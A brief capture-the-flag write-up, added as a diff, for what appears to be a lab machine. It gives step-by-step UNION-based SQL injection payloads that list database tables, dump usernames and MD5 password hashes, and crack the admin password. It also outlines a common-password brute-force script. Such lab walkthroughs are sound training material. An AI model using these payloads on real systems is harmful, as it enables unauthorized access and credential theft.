@@ -1,0 +1,27 @@
+Goto http://10.111.1.21/index.php?page=member
+
+Enter '0 OR 1 = 2 UNION SELECT table_name, column_name FROM information_schema.COLUMNS'
+There you can see the columns 'username' and 'password' - that is what we need!!!
+The table of that stuff is 'db_default'
+
+Make another query '0 OR 1 = 2 UNION SELECT table_schema, table_name FROM information_schema.TABLES'
+For 'db_default' table schema is 'Member_Brute_Force'
+
+So make another query '0 OR 1 = 2 UNION SELECT username, password FROM Member_Brute_Force.db_default'
+Here you can see passwords for 'root' and 'admin' - '3bf1114a986ba87ed28fc1b5884fc2f8'
+
+Goto https://www.md5online.org/md5-decrypt.html and try to decrypt this hash. We get 'shadow' as a password.
+
+--
+
+Another case is to brute force the pass.
+
+Goto https://en.wikipedia.org/wiki/List_of_the_most_common_passwords.
+Copy the most popular passwords to the file 'pass_brute_force.sh' to the variable 'pass_list' and run the script "sh pass_brute_force.sh"
+
+The you can see tha pass and the flag in case the pass was matched.
+
+
+=====
+
+The pass = 'shadow'
